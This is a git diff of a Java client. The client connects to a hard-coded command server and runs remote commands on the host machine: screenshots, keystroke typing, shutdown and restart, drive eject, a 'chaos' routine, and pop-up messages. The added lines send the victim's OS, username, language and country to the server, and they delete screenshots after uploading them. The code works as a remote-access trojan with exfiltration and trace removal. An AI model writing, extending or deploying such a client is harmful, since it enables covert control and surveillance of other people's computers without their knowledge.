@@ -17,6 +17,7 @@ public class Client
     private Socket socket;
     private CommandSet commandSet;
     private DataInputStream inFromServer;
+    private DataOutputStream outToServer;
 
     public Client() throws IOException, UnknownOperatingSystemException, AWTException
     {
@@ -32,11 +33,11 @@ public class Client
     private CommandSet setCommandSet() throws UnknownOperatingSystemException
     {
         String operatingSystem = System.getProperty("os.name");
-        if(operatingSystem.equals("Linux"))
+        if(operatingSystem.equals(OS_LINUX))
             return new LinuxCommandSet();
-        if(operatingSystem.startsWith("Windows"))
+        if(operatingSystem.startsWith(OS_WINDOWS))
             return new WindowsCommandSet();
-        if(operatingSystem.startsWith("Mac"))
+        if(operatingSystem.startsWith(OS_MAC))
             return new MacCommandSet();
 
         throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
@@ -50,16 +51,17 @@ public class Client
     {
         socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
         inFromServer = new DataInputStream(socket.getInputStream());
+        outToServer = new DataOutputStream(socket.getOutputStream());
 
         while(socket.isConnected())
         {
             String serverCommand = getCommandFromServer();
             System.out.println("Command read from server: " + serverCommand);
-            if(serverCommand.equals(TYPE) || serverCommand.equals(SOUND)) // 1 arg commands
+            if(serverCommand.equals(CMD_TYPE) || serverCommand.equals(CMD_SOUND)) // 1 arg commands
                 processServerCommand(serverCommand, getCommandFromServer());
-            else if(serverCommand.equals(CHAOS)) // 2 arg commands
+            else if(serverCommand.equals(CMD_CHAOS)) // 2 arg commands
                 processServerCommand(serverCommand, getCommandFromServer(), getCommandFromServer());
-            else if(serverCommand.equals(MSG)) // 4 arg commands
+            else if(serverCommand.equals(CMD_MSG)) // 4 arg commands
                 processServerCommand(serverCommand, getCommandFromServer(), getCommandFromServer(), getCommandFromServer());
             else
                 processServerCommand(serverCommand);
@@ -99,11 +101,10 @@ public class Client
     {
         File sound = File.createTempFile("sou", ".wav", new File(commandSet.getTempPath()));
         byte[] buffer = new byte[size];
-        DataInputStream in = new DataInputStream(socket.getInputStream());
 
         FileOutputStream fos = new FileOutputStream(sound);
         System.out.println("Before readFully: File: " + sound.getName() + " with size: " + size);
-        in.readFully(buffer, 0, size);
+        inFromServer.readFully(buffer, 0, size);
         fos.write(buffer, 0, size);
         fos.flush();
         System.out.println("After readFully: Size: " + sound.length());
@@ -122,9 +123,8 @@ public class Client
     {
         byte[] buffer = new byte[(int)toSend.length()];
         InputStream sendMe = new FileInputStream(toSend);
-        DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream());
 
-        outToServer.writeInt((int)toSend.length());
+        outToServer.writeInt((int) toSend.length());
         int count;
         int sentBytes = 0;
         while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
@@ -146,10 +146,10 @@ public class Client
     {
         switch(serverCommand[0].toLowerCase())
         {
-            case EJECT:
+            case CMD_EJECT:
                 commandSet.eject();
                 return;
-            case SOUND: // special case: sound requires the sound file from the server so we must retrieve it
+            case CMD_SOUND: // special case: sound requires the sound file from the server so we must retrieve it
                 try
                 {
                     int fileSize = Integer.valueOf(serverCommand[1]);
@@ -161,30 +161,45 @@ public class Client
                     e.printStackTrace();
                 }
                 return;
-            case SCREENSHOT:
+            case CMD_SCREENSHOT:
                 commandSet.takeScreenshot();
                 return;
-            case MSG:
+            case CMD_MSG:
                 commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                 return;
-            case SHUTDOWN:
+            case CMD_SHUTDOWN:
                 commandSet.shutdown();
                 return;
-            case RESTART:
+            case CMD_RESTART:
                 commandSet.restart();
                 return;
-            case CHAOS:
+            case CMD_CHAOS:
                 commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                 break;
-            case TYPE:
+            case CMD_TYPE:
                 commandSet.type(serverCommand[1]);
                 break;
-            case RETRIEVE:
+            case CMD_RETRIEVE:
                 sendAllImages();
+                break;
+            case CMD_SYSINFO:
+                sendOSInfo();
                 break;
             default:
                 System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
         }
+    }
+
+    /**
+     * sends this clients os info to the server, including the os name, jre arch, java version,
+     * language, country, username and desktop variant
+     * @throws IOException if something went wrong writing to the server
+     */
+    private void sendOSInfo() throws IOException
+    {
+        String os = "OS       : " + System.getProperty("os.name") + "\nJRE arch : " + System.getProperty("os.arch") + "\nJava     : " + System.getProperty("java.version") + "\nUsername : " + System.getProperty("user.name") + "\nLanguage : " + System.getProperty("user.language") + "\nCountry  : " + System.getProperty("user.country") + "\nDesktop  : " + System.getProperty("sun.desktop");
+        outToServer.writeInt(os.length());
+        outToServer.write(os.getBytes(), 0, os.length());
     }
 
     private void sendAllImages() //todo: refactor
@@ -214,6 +229,7 @@ public class Client
                 try
                 {
                     sendFile(file);
+                    file.delete();
                 }
                 catch(IOException ioe)
                 {
